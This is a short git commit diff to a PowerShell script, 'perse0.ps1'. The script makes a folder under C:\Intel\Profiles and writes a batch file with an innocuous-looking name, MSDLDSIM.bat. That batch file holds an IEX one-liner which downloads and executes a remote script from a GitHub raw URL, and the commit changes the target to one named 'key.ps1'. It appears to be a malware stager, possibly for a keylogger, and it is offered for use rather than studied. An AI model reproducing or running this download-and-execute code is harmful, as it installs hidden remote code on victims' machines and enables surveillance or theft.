88c70b4e83dd31b9a8916dbeabb0ba41c8691eb2
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-09-02 10:46:05 -0500

    Update perse0.ps1

--- perse0.ps1
+++ perse0.ps1
@@ -1,3 +1,3 @@
 md C:\Intel\Profiles/IE/IEX2; $contentToAdd = @"
-powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercod1.ps1').GetResponse().GetResponseStream()).ReadToEnd());
+powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/key.ps1').GetResponse().GetResponseStream()).ReadToEnd());
 "@; add-content "C:\Intel\Profiles/IE/IEX/MSDLDSIM.bat" $contenttoadd;
